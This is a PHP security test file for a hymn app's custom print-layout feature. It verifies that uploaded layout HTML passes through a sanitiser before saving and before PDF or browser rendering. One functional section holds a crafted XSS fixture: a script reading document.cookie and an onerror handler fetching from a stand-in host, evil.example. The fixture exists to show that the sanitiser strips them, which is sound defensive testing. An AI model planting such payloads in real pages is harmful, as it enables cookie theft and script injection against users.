<?php

declare(strict_types=1);

/**
 * iHymns — Custom print-layout (feature E) wiring guard (#1767 remainder P7)
 *
 * ELI5: this makes sure a curator's uploaded full-page layout HTML can never
 * skip the sanitiser on the way IN, and that the printed page/PDF can never
 * be built from the RAW (unsanitised) copy on the way OUT — only the
 * server-sanitised copy is ever rendered, and the one `{{content}}` slot is
 * where the actual song gets substituted in.
 *
 * DETAIL — THREE INDEPENDENT GUARDS, ONE FILE (mirrors the shape of
 * `tests/php/test-print-usage-ccli-gate.php` / `test-ia-reconcile-guards.php`
 * — several related assertion groups for one small feature, one guard file):
 *
 *   §A THE SAVE PATH sanitises with 'layout' and stamps a version
 *      (`.claude/print-templates-1767-remainder-plan.md` §7.1 point 1).
 *      `includes/print_custom_layout.php::printCustomLayoutSave()` must call
 *      `ihymnsSanitizeHtml($rawHtml, 'layout')` — never 'print' (the OTHER,
 *      narrower profile — that one is the PDF-endpoint's INPUT vocabulary,
 *      not a curator's upload vocabulary) — and must persist
 *      `SanitiserVersion` from `IHYMNS_HTML_SANITISER_VERSION`, BOTH before
 *      the `INSERT`/`ON DUPLICATE KEY UPDATE` actually runs (source-order,
 *      not just "appears somewhere in the function").
 *
 *   §B THE RENDER PATH never reads `HtmlOriginal` and substitutes
 *      `{{content}}` with sanitised content (§7.1 points 2/3/4). Two
 *      independent proofs of "never reads HtmlOriginal", because the
 *      STRONGER one (the wire never carries it) makes the weaker one (the
 *      client code doesn't look for it) almost redundant — kept anyway as
 *      defence-in-depth, per this file's own documented limitation:
 *        B1. `includes/print_custom_layout.php`'s TWO render-path functions
 *            (`printCustomLayoutGetSanitised()`, `…ForTemplates()`) SELECT
 *            `HtmlSanitised` and, comment-stripped, contain ZERO occurrences
 *            of the literal `HtmlOriginal` anywhere in their bodies — so
 *            even the DB READ that ultimately reaches the client structurally
 *            cannot carry the raw upload.
 *        B2. `api.php` (the render path's ONE client-facing JSON emitter),
 *            `manage/print-pdf.php`, and `includes/pdf_renderer.php` —
 *            comment-stripped via the real tokenizer — contain ZERO
 *            occurrences of the literal `HtmlOriginal` ANYWHERE in the whole
 *            file. Given B1 already proves the column never leaves the DB
 *            layer, this is belt-and-braces: even if some future code tried
 *            to reference it, it would have nothing to reference (the value
 *            was never selected), but this still catches a copy-pasted
 *            SELECT * or a second, forked reader.
 *        B3. `js/modules/print.js` exports `applyCustomLayout()`, whose body
 *            performs the `{{content}}` substitution FIRST (before the
 *            metadata tokens); `buildPrintDoc()` and `downloadSongPdf()`
 *            (the browser-print and PDF-download bodies) both CALL it.
 *            KNOWN, DOCUMENTED LIMITATION: unlike PHP source, this file has
 *            no reliable JS comment/string lexer available in this
 *            codebase's test tooling, so print.js is checked with a
 *            property-access-SHAPED regex (`.htmlOriginal`, `['HtmlOriginal']`,
 *            …) rather than a true comment-stripped scan — a bare PROSE
 *            mention (this file's own doc-comments legitimately explain the
 *            invariant by name) is deliberately NOT flagged, so the check
 *            stays narrow enough not to fail on correct code (rule #34's
 *            "a guard so blunt it fails on correct code…gets it weakened or
 *            deleted rather than fixed"). B1/B2 above are the load-bearing
 *            proof for print.js's OWN inability to ever receive the value;
 *            this is a secondary tripwire, not the primary guarantee.
 *
 *   §C THE ENDPOINT ALWAYS ROUTES THROUGH THE SANITISER, widened to
 *      'layout' (§7.1 point 4 — "the endpoint sanitises with layout, which
 *      is a superset — one profile at the endpoint, tightest at upload").
 *      `manage/print-pdf.php` must call `ihymnsSanitizeHtml(…, 'layout')`
 *      BEFORE `ihymnsPdfRender(` (source-order — never converted before
 *      sanitised), and must NOT call it with 'print' anywhere in the file
 *      (confirms the widening landed everywhere, not as a stray leftover
 *      second call).
 *
 *   §D FUNCTIONAL — a single crafted layout fixture containing FOUR
 *      simultaneous attack shapes (`<script>`, an `on*` handler, a
 *      `/song-media/123` gated-media `<img>`, and an mPDF-proprietary
 *      `<barcode>` tag) PLUS one legitimate `{{content}}` token, run through
 *      the REAL `ihymnsSanitizeHtml($x, 'layout')` (never a mock/stub):
 *      asserts the `{{content}}` token survives EXACTLY ONCE while none of
 *      the four attack shapes survive in any form. This is the SAME module
 *      `tests/php/test-html-sanitizer.php` already covers generically
 *      (§5.5) — repeated here as a feature-E-specific, single-fixture
 *      regression lock, not a substitute for that broader truth table.
 *
 * PART E (DB, else SKIP) — behavioural round trip through the REAL writer +
 * both readers + the deleter, proving the whole pipeline end to end:
 *   E1. A raw upload containing a `<script>` + the `{{content}}` token saves
 *       successfully; the SANITISED read (`printCustomLayoutGetSanitised()`)
 *       contains no `<script`, while the EDIT-PATH read
 *       (`printCustomLayoutGetForEdit()`) still contains the raw
 *       `<script>` bytes — proving `HtmlOriginal` legitimately preserves
 *       the upload for RE-EDITING while `HtmlSanitised` (what E2 below
 *       proves is the ONLY thing the batch/render reader returns) never
 *       does.
 *   E2. Zero `{{content}}` tokens → `ok:false` (rejected, never persisted).
 *   E3. Two `{{content}}` tokens → `ok:false` (rejected, never persisted).
 *   E4. `printCustomLayoutDelete()` removes the row; a subsequent
 *       `printCustomLayoutGetSanitised()` returns `null`.
 * All inside a transaction, ROLLED BACK at the end — mirrors
 * `tests/php/test-print-usage-ccli-gate.php`'s Part B shape exactly.
 *
 * MUTATION-PROVEN (rule #34): see the session report for the exact
 * mutations run against this file (swap 'layout' → 'print' in the save
 * path; delete the SanitiserVersion column from the INSERT; add a
 * `HtmlOriginal` read to a render-path function; remove the
 * applyCustomLayout() call from buildPrintDoc(); revert print-pdf.php's
 * sanitiser profile back to 'print') and the resulting RED output, followed
 * by `git checkout --` restoring the byte-identical GREEN state.
 *
 *   php tests/php/test-print-custom-layout.php
 *         (Part E needs IHYMNS_TEST_DSN with a dbname, or appWeb/.auth/db_credentials.php)
 * Exit: 0 = pass (Part E may SKIP if no DB — Parts A–D still ran), 1 = failure.
 *
 * @see .claude/print-templates-1767-remainder-plan.md §7   the full design this file implements
 * @see appWeb/public_html/includes/print_custom_layout.php  the ONE writer + the two read shapes under test
 * @see appWeb/public_html/includes/html_sanitizer.php        the 'layout' profile itself (§D reuses it directly)
 * @see appWeb/public_html/js/modules/print.js                 applyCustomLayout() — the {{content}} substitution point
 * @see appWeb/public_html/manage/print-pdf.php                 the server-PDF funnel (§C)
 * @see appWeb/public_html/api.php                              the render path's ONE client-facing emitter (§B2)
 * @see tests/php/test-print-usage-ccli-gate.php                the Part A / Part B (DB, else SKIP) shape this mirrors
 * @see tests/php/test-html-sanitizer.php                       the broader sanitiser truth table (§D is a narrower, feature-specific echo of it)
 */

$repoRoot   = dirname(__DIR__, 2);
$publicRoot = $repoRoot . '/appWeb/public_html';

$failures = 0;
$passed   = 0;
function pcl(bool $cond, string $label): void
{
    global $failures, $passed;
    if ($cond) {
        $passed++;
        echo "PASS: $label\n";
    } else {
        $failures++;
        fwrite(STDERR, "FAIL: $label\n");
    }
}

/** Strip PHP comments via the REAL tokenizer (never a slash-star regex —
 *  test-print-one-renderer.php's doc-block explains the exact false-positive
 *  class a naive regex hits: a real string literal containing a bare
 *  comment-open two characters from its end is misread as entering a
 *  comment). Keeps line numbers stable (replaces comment bytes with spaces,
 *  never deletes them) — mirrors test-print-usage-ccli-gate.php's
 *  pucStripComments() exactly. */
function pclStripPhpComments(string $src): string
{
    $out = '';
    foreach (token_get_all($src) as $tok) {
        if (is_array($tok)) {
            if ($tok[0] === T_COMMENT || $tok[0] === T_DOC_COMMENT) {
                $out .= preg_replace('/[^\n]/', ' ', $tok[1]);
                continue;
            }
            $out .= $tok[1];
            continue;
        }
        $out .= $tok;
    }
    return $out;
}

/** Extract a top-level PHP function's body (brace-BALANCED, so nested
 *  if/foreach/try blocks are handled correctly — mirrors
 *  test-print-usage-ccli-gate.php's pucFunctionBody() exactly). Call on
 *  COMMENT-STRIPPED source only (a `{`/`}` inside a doc-comment would
 *  otherwise throw the depth count off — none of this file's source strings
 *  contain a brace character, so this is safe post-strip). */
function pclFunctionBody(string $strippedSrc, string $name): ?string
{
    if (!preg_match('/function\s+' . preg_quote($name, '/') . '\s*\([^)]*\)[^{]*\{/', $strippedSrc, $m, PREG_OFFSET_CAPTURE)) {
        return null;
    }
    $bracePos = $m[0][1] + strlen($m[0][0]) - 1;
    $depth = 0;
    $len = strlen($strippedSrc);
    for ($i = $bracePos; $i < $len; $i++) {
        if ($strippedSrc[$i] === '{') {
            $depth++;
        } elseif ($strippedSrc[$i] === '}') {
            $depth--;
            if ($depth === 0) {
                return substr($strippedSrc, $bracePos + 1, $i - $bracePos - 1);
            }
        }
    }
    return null;
}

/** Extract a top-level JS function's body by finding a lone `}` alone on its
 *  own line — the consistent closing-brace style every top-level function in
 *  print.js uses (verified by eye against the actual file; NOT a general JS
 *  parser). Documented, narrow-purpose limitation, same posture as the
 *  print.js property-access regex above: good enough for THIS file's actual
 *  formatting, not claimed to work on arbitrary JS. */
function pclJsFunctionBody(string $src, string $namePattern): ?string
{
    if (!preg_match('/' . $namePattern . '\s*\([^)]*\)\s*\{/', $src, $m, PREG_OFFSET_CAPTURE)) {
        return null;
    }
    $bodyStart = $m[0][1] + strlen($m[0][0]);
    $closeMatch = null;
    if (preg_match('/\n\}/', $src, $closeMatch, PREG_OFFSET_CAPTURE, $bodyStart)) {
        return substr($src, $bodyStart, $closeMatch[0][1] - $bodyStart);
    }
    return null;
}

$layoutPath   = $publicRoot . '/includes/print_custom_layout.php';
$sanitizerPath = $publicRoot . '/includes/html_sanitizer.php';
$printPdfPath = $publicRoot . '/manage/print-pdf.php';
$pdfRendererPath = $publicRoot . '/includes/pdf_renderer.php';
$apiPath      = $publicRoot . '/api.php';
$printJsPath  = $publicRoot . '/js/modules/print.js';

foreach ([
    'includes/print_custom_layout.php' => $layoutPath,
    'includes/html_sanitizer.php'      => $sanitizerPath,
    'manage/print-pdf.php'             => $printPdfPath,
    'includes/pdf_renderer.php'        => $pdfRendererPath,
    'api.php'                          => $apiPath,
    'js/modules/print.js'              => $printJsPath,
] as $rel => $path) {
    pcl(is_file($path), "A0 $rel exists");
}
if ($failures > 0) {
    fwrite(STDERR, "\nFATAL: one or more #1767 remainder P7 files are missing — cannot continue.\n");
    exit(1);
}

$layoutSrc  = pclStripPhpComments((string)file_get_contents($layoutPath));
$printPdfSrc = pclStripPhpComments((string)file_get_contents($printPdfPath));
$pdfRendererSrc = pclStripPhpComments((string)file_get_contents($pdfRendererPath));
$apiSrc     = pclStripPhpComments((string)file_get_contents($apiPath));
$printJsSrc = (string)file_get_contents($printJsPath); // JS — no comment-stripper available, see §B3's doc-block note

/* =============================================================================
 * §A — THE SAVE PATH: printCustomLayoutSave() sanitises with 'layout' (never
 * 'print') and stamps SanitiserVersion, BOTH before the INSERT.
 * ============================================================================= */
$saveBody = pclFunctionBody($layoutSrc, 'printCustomLayoutSave');
pcl($saveBody !== null, 'A0.1 extracted printCustomLayoutSave() function body');
if ($saveBody !== null) {
    $sanitisePos = strpos($saveBody, "ihymnsSanitizeHtml(\$rawHtml, 'layout')");
    $insertPos   = strpos($saveBody, 'INSERT INTO tblPrintTemplateCustomLayout');
    $tokenCheckPos = strpos($saveBody, 'substr_count(');
    $versionReadPos = strpos($saveBody, 'IHYMNS_HTML_SANITISER_VERSION');
    $versionColPos  = strpos($saveBody, 'SanitiserVersion');

    pcl($sanitisePos !== false, "A1 printCustomLayoutSave() calls ihymnsSanitizeHtml(\$rawHtml, 'layout')");
    pcl(
        preg_match("/ihymnsSanitizeHtml\([^)]*'print'\)/", $saveBody) === 0,
        "A2 printCustomLayoutSave() never calls ihymnsSanitizeHtml(..., 'print') — only the wider 'layout' profile belongs in the SAVE path"
    );
    pcl($insertPos !== false, 'A3.0 printCustomLayoutSave() contains the INSERT INTO tblPrintTemplateCustomLayout statement');
    pcl(
        $sanitisePos !== false && $insertPos !== false && $sanitisePos < $insertPos,
        'A3.1 the sanitise call happens BEFORE the INSERT — never converted/persisted before being cleaned'
    );
    pcl(
        $tokenCheckPos !== false && $insertPos !== false && $tokenCheckPos < $insertPos,
        'A3.2 the {{content}}-count validation (substr_count) happens BEFORE the INSERT — a layout with 0 or 2+ tokens is rejected, never persisted'
    );
    pcl($versionReadPos !== false, 'A4.0 printCustomLayoutSave() reads IHYMNS_HTML_SANITISER_VERSION');
    pcl($versionColPos !== false, 'A4.1 printCustomLayoutSave() persists the SanitiserVersion column');
    pcl(
        $versionReadPos !== false && $insertPos !== false && $versionReadPos < $insertPos,
        'A4.2 the version is read BEFORE the INSERT — every saved row is stamped with the version that actually produced it'
    );
}

/* =============================================================================
 * §B1 — the TWO render-path read functions SELECT HtmlSanitised and never
 * reference HtmlOriginal, comment-stripped.
 * ============================================================================= */
foreach (['printCustomLayoutGetSanitised', 'printCustomLayoutGetSanitisedForTemplates'] as $fn) {
    $body = pclFunctionBody($layoutSrc, $fn);
    pcl($body !== null, "B1.0 extracted {$fn}() function body");
    if ($body !== null) {
        pcl(str_contains($body, 'HtmlSanitised'), "B1.1 {$fn}() selects HtmlSanitised");
        pcl(!str_contains($body, 'HtmlOriginal'), "B1.2 {$fn}() (the RENDER path) never references HtmlOriginal");
    }
}
/* Sanity floor: the OTHER (edit-path) function DOES legitimately reference
   HtmlOriginal — proves the check above isn't vacuously true because the
   literal never appears ANYWHERE in this file (a scanner that never finds
   the term it's checking for is worse than none, rule #34). */
$editBody = pclFunctionBody($layoutSrc, 'printCustomLayoutGetForEdit');
pcl($editBody !== null && str_contains($editBody, 'HtmlOriginal'), 'B1.3 sanity: the EDIT-path reader printCustomLayoutGetForEdit() DOES reference HtmlOriginal (proves B1.2 is a real distinction, not an always-true scan)');

/* =============================================================================
 * §B2 — api.php / manage/print-pdf.php / includes/pdf_renderer.php never
 * reference HtmlOriginal ANYWHERE, comment-stripped.
 * ============================================================================= */
foreach ([
    'api.php'                     => $apiSrc,
    'manage/print-pdf.php'        => $printPdfSrc,
    'includes/pdf_renderer.php'   => $pdfRendererSrc,
] as $rel => $src) {
    pcl(!str_contains($src, 'HtmlOriginal'), "B2 {$rel} never references HtmlOriginal (comment-stripped whole-file scan)");
}
/* Sanity floor: api.php DOES wire the render-path reader in (so B2's PASS
   isn't just "this file barely does anything with layouts at all"). */
pcl(str_contains($apiSrc, 'printCustomLayoutGetSanitisedForTemplates('), 'B2.1 sanity: api.php DOES call printCustomLayoutGetSanitisedForTemplates() — the render-path wiring actually exists');

/* =============================================================================
 * §B3 — js/modules/print.js: applyCustomLayout() exists, substitutes
 * {{content}}, and is CALLED by both buildPrintDoc() and downloadSongPdf().
 * Documented limitation (see this file's own doc-block): a property-access-
 * shaped regex, not a true comment-stripped scan — B1/B2 above are the
 * load-bearing proof that print.js could never receive the raw value at all.
 * ============================================================================= */
pcl(
    preg_match('/export\s+function\s+applyCustomLayout\s*\(/', $printJsSrc) === 1,
    'B3.0 print.js exports applyCustomLayout()'
);
$applyBody = pclJsFunctionBody($printJsSrc, 'export\s+function\s+applyCustomLayout');
pcl($applyBody !== null, 'B3.1 extracted applyCustomLayout() function body');
if ($applyBody !== null) {
    pcl(str_contains($applyBody, "IHYMNS_CUSTOM_LAYOUT_CONTENT_TOKEN"), 'B3.2 applyCustomLayout() substitutes the {{content}} token');
    pcl(
        strpos($applyBody, 'split(IHYMNS_CUSTOM_LAYOUT_CONTENT_TOKEN)') !== false
            && strpos($applyBody, 'split(IHYMNS_CUSTOM_LAYOUT_CONTENT_TOKEN)') < (strpos($applyBody, 'metaTokens') !== false ? strpos($applyBody, 'metaTokens') : PHP_INT_MAX),
        'B3.3 the {{content}} substitution happens BEFORE the metadata-token substitutions (raw-HTML insert first, escaped-text inserts second)'
    );
}
pcl(str_contains($printJsSrc, "const IHYMNS_CUSTOM_LAYOUT_CONTENT_TOKEN = '{{content}}';"), 'B3.4 the content-token constant is literally {{content}}');

/* B3.5/B3.6 look for the FULL call-with-real-arguments SHAPE
   (`applyCustomLayout(<var>.layoutHtml, song, contentHtml)`), not just the
   bare function name — a doc-comment inside either function is free to
   MENTION "applyCustomLayout()" by name (both bodies below have exactly
   such a comment, explaining WHY the call exists), and a bare-name
   `str_contains()` check would be FOOLED by that prose into a false PASS
   even with the real call site deleted (caught by mutation-testing this
   guard: deleting the actual ternary while leaving the explanatory comment
   in place stayed GREEN on a bare-name check, red on this one). */
$buildDocBody = pclJsFunctionBody($printJsSrc, 'export\s+function\s+buildPrintDoc');
pcl(
    $buildDocBody !== null && str_contains($buildDocBody, 'applyCustomLayout(template.layoutHtml, song, contentHtml)'),
    'B3.5 buildPrintDoc() (the browser-print body) calls applyCustomLayout(template.layoutHtml, song, contentHtml)'
);

$downloadBody = pclJsFunctionBody($printJsSrc, 'async\s+function\s+downloadSongPdf');
pcl(
    $downloadBody !== null && str_contains($downloadBody, 'applyCustomLayout(tpl.layoutHtml, song, contentHtml)'),
    'B3.6 downloadSongPdf() (the PDF-download body) calls applyCustomLayout(tpl.layoutHtml, song, contentHtml)'
);

/* Defence-in-depth, narrow-by-design (see doc-block): no property-access-
   SHAPED reference to htmlOriginal/HtmlOriginal anywhere in print.js. A bare
   prose mention (e.g. this file's own doc-comments) does NOT match — only a
   `.htmlOriginal` / `['HtmlOriginal']` / `("htmlOriginal")`-shaped use would. */
pcl(
    preg_match('/[.\[(\'"]\s*[\'"]?[Hh]tml[Oo]riginal\b/', $printJsSrc) === 0,
    'B3.7 print.js has no property-access-shaped reference to (h/H)tmlOriginal (defence-in-depth; B1/B2 are the load-bearing proof)'
);

/* =============================================================================
 * §C — manage/print-pdf.php ALWAYS routes through the sanitiser, widened to
 * 'layout', BEFORE ihymnsPdfRender(); never 'print' anywhere in the file.
 * ============================================================================= */
$sanitiseLayoutPos = strpos($printPdfSrc, "ihymnsSanitizeHtml((string)\$d['bodyHtml'], 'layout')");
$pdfRenderCallPos  = strpos($printPdfSrc, 'ihymnsPdfRender(');
pcl($sanitiseLayoutPos !== false, "C1 manage/print-pdf.php calls ihymnsSanitizeHtml((string)\$d['bodyHtml'], 'layout')");
pcl($pdfRenderCallPos !== false, 'C2 manage/print-pdf.php calls ihymnsPdfRender(');
pcl(
    $sanitiseLayoutPos !== false && $pdfRenderCallPos !== false && $sanitiseLayoutPos < $pdfRenderCallPos,
    'C3 the sanitise call happens BEFORE ihymnsPdfRender() — every document is cleaned before conversion, never after'
);
pcl(
    preg_match("/ihymnsSanitizeHtml\([^)]*'print'\)/", $printPdfSrc) === 0,
    "C4 manage/print-pdf.php never calls ihymnsSanitizeHtml(..., 'print') anywhere — the widening to 'layout' is complete, not a stray leftover second call"
);

/* =============================================================================
 * §D — FUNCTIONAL: the real 'layout' sanitiser neutralises all four crafted
 * attack shapes simultaneously while preserving the {{content}} slot.
 * ============================================================================= */
require_once $sanitizerPath;

$crafted = '<div class="cover">'
    . '<script>alert(document.cookie)</script>'
    . '<img src="/song-media/123" onerror="fetch(\'//evil.example/x\')" alt="gated">'
    . '<barcode code="1234567890128" type="EAN13" />'
    . '<h1>{{content}}</h1>'
    . '</div>';
$sanitisedD = ihymnsSanitizeHtml($crafted, 'layout');

pcl(substr_count($sanitisedD, '{{content}}') === 1, 'D1 the crafted layout\'s {{content}} token survives EXACTLY ONCE');
pcl(!str_contains(strtolower($sanitisedD), '<script'), 'D2 <script> never survives as an element');
pcl(!str_contains(strtolower($sanitisedD), 'onerror'), 'D3 the onerror= handler is stripped');
pcl(!str_contains($sanitisedD, '/song-media/123'), 'D4 the /song-media/123 gated-media reference is dropped entirely (rule M)');
pcl(!str_contains(strtolower($sanitisedD), '<barcode'), 'D5 the mPDF-proprietary <barcode> tag never survives as an element');
pcl(str_contains($sanitisedD, '<h1>'), 'D6 sanity: the sanitiser is not just returning an empty string — a legitimate wrapper tag survives alongside the neutralised attack payload');

/* =============================================================================
 * PART E — behavioural (DB, else SKIP): the real writer + both readers +
 * the deleter, round-tripped against a scratch tblPrintTemplates row.
 * ============================================================================= */

$host = '127.0.0.1'; $user = 'root'; $pass = ''; $sock = null; $port = 3306; $dbName = null;
$credFile = $repoRoot . '/appWeb/.auth/db_credentials.php';
if (is_readable($credFile)) {
    require $credFile;
    if (defined('DB_HOST')) { $host = DB_HOST; }
    if (defined('DB_USER')) { $user = DB_USER; }
    if (defined('DB_PASS')) { $pass = DB_PASS; }
    if (defined('DB_PORT')) { $port = (int)DB_PORT; }
    if (defined('DB_NAME')) { $dbName = DB_NAME; }
} else {
    $dsn = getenv('IHYMNS_TEST_DSN') ?: '';
    if ($dsn !== '') {
        foreach (explode(';', $dsn) as $kv) {
            [$k, $v] = array_pad(explode('=', $kv, 2), 2, '');
            if ($k === 'host')   { $host = $v; }
            if ($k === 'user')   { $user = $v; }
            if ($k === 'pass')   { $pass = $v; }
            if ($k === 'socket') { $sock = $v; }
            if ($k === 'port')   { $port = (int)$v; }
            if ($k === 'dbname' || $k === 'db') { $dbName = $v; }
        }
    }
}

$behaviouralRan = false;
if ($dbName !== null && $sock === null) {
    if (!defined('DB_HOST')) { define('DB_HOST', $host); }
    if (!defined('DB_USER')) { define('DB_USER', $user); }
    if (!defined('DB_PASS')) { define('DB_PASS', $pass); }
    if (!defined('DB_PORT')) { define('DB_PORT', (string)$port); }
    if (!defined('DB_NAME')) { define('DB_NAME', $dbName); }

    require_once $layoutPath;

    try {
        $db = getDbMysqli();
        $hasLayoutTable   = (bool)$db->query("SHOW TABLES LIKE 'tblPrintTemplateCustomLayout'")->num_rows;
        $hasTemplateTable = (bool)$db->query("SHOW TABLES LIKE 'tblPrintTemplates'")->num_rows;
    } catch (\Throwable $e) {
        $db = null; $hasLayoutTable = false; $hasTemplateTable = false;
    }

    if ($db !== null && $hasLayoutTable && $hasTemplateTable) {
        $db->begin_transaction();
        try {
            /* A REAL scratch tblPrintTemplates row — the FK the layout table
               enforces needs a genuine parent id, mirroring
               test-print-usage-ccli-gate.php's "a bogus id lets the schema's
               own FK constraints mask a bypassed gate behind a DB error"
               lesson (there: a SongId FK; here: a TemplateId FK). */
            $eName = 'zzpl1767' . substr((string)mt_rand(), 0, 6);
            $insT = $db->prepare(
                "INSERT INTO tblPrintTemplates (Name, Scope, OwnerId, BlocksJson, PageOptionsJson, IsActive, IsDefault, SortOrder)
                 VALUES (?, 'song', NULL, '[]', NULL, 1, 0, 0)"
            );
            $insT->bind_param('s', $eName);
            $insT->execute();
            $eTemplateId = (int)$db->insert_id;
            $insT->close();

            /* E1 — a raw upload with a <script> + exactly one {{content}}
               token saves; the SANITISED read strips the script, the
               EDIT-PATH read preserves the raw bytes for re-editing. */
            $e1Raw = '<div class="cover"><script>alert(1)</script><h1>{{content}}</h1></div>';
            $e1 = printCustomLayoutSave($eTemplateId, $e1Raw, null);
            pcl($e1['ok'] === true, 'E1.1 printCustomLayoutSave() with a valid single {{content}} token succeeds');

            $e1Sanitised = printCustomLayoutGetSanitised($eTemplateId);
            pcl($e1Sanitised !== null && !str_contains(strtolower($e1Sanitised), '<script'), 'E1.2 printCustomLayoutGetSanitised() (the RENDER path) never contains <script');
            pcl($e1Sanitised !== null && str_contains($e1Sanitised, '{{content}}'), 'E1.3 …and still carries the {{content}} slot');

            $e1Batch = printCustomLayoutGetSanitisedForTemplates([$eTemplateId]);
            pcl(
                isset($e1Batch[$eTemplateId]) && $e1Batch[$eTemplateId] === $e1Sanitised,
                'E1.4 printCustomLayoutGetSanitisedForTemplates() (the batch render-path reader api.php uses) agrees with the single-row reader'
            );

            $e1Edit = printCustomLayoutGetForEdit($eTemplateId);
            pcl(
                $e1Edit !== null && str_contains($e1Edit['htmlOriginal'], '<script>alert(1)</script>'),
                'E1.5 printCustomLayoutGetForEdit() (the EDIT path) preserves the RAW <script> bytes for re-editing — the sanitised copy at E1.2 does not'
            );

            /* E2/E3 — the {{content}}-count guard, exercised through the
               REAL public function (not just the source-order check in §A). */
            $e2 = printCustomLayoutSave($eTemplateId, '<div>no slot here at all</div>', null);
            pcl($e2['ok'] === false, 'E2 printCustomLayoutSave() with ZERO {{content}} tokens is REJECTED');

            $e3 = printCustomLayoutSave($eTemplateId, '<div>{{content}}...{{content}}</div>', null);
            pcl($e3['ok'] === false, 'E3 printCustomLayoutSave() with TWO {{content}} tokens is REJECTED');

            /* Neither E2 nor E3 should have overwritten the good E1 row. */
            $stillSanitised = printCustomLayoutGetSanitised($eTemplateId);
            pcl(
                $stillSanitised === $e1Sanitised,
                'E3.1 …and neither rejected save touched the previously-saved good layout'
            );

            /* E4 — delete removes the row; the render-path reader then
               returns null (never a stale/deleted-but-visible copy). */
            $e4 = printCustomLayoutDelete($eTemplateId);
            pcl($e4 === true, 'E4.1 printCustomLayoutDelete() reports success');
            pcl(printCustomLayoutGetSanitised($eTemplateId) === null, 'E4.2 …and printCustomLayoutGetSanitised() now returns null');

            $behaviouralRan = true;
        } finally {
            $db->rollback();
        }
    }
}

if ($failures > 0) {
    fwrite(STDERR, "\n{$passed} passed, {$failures} failed\n");
    exit(1);
}
echo "\n{$passed} passed, 0 failed";
echo $behaviouralRan
    ? " (Part E ran against a live DB).\n"
    : " (Part E SKIPPED: no reachable database, or tblPrintTemplateCustomLayout/tblPrintTemplates absent — Parts A–D still ran).\n";
exit(0);
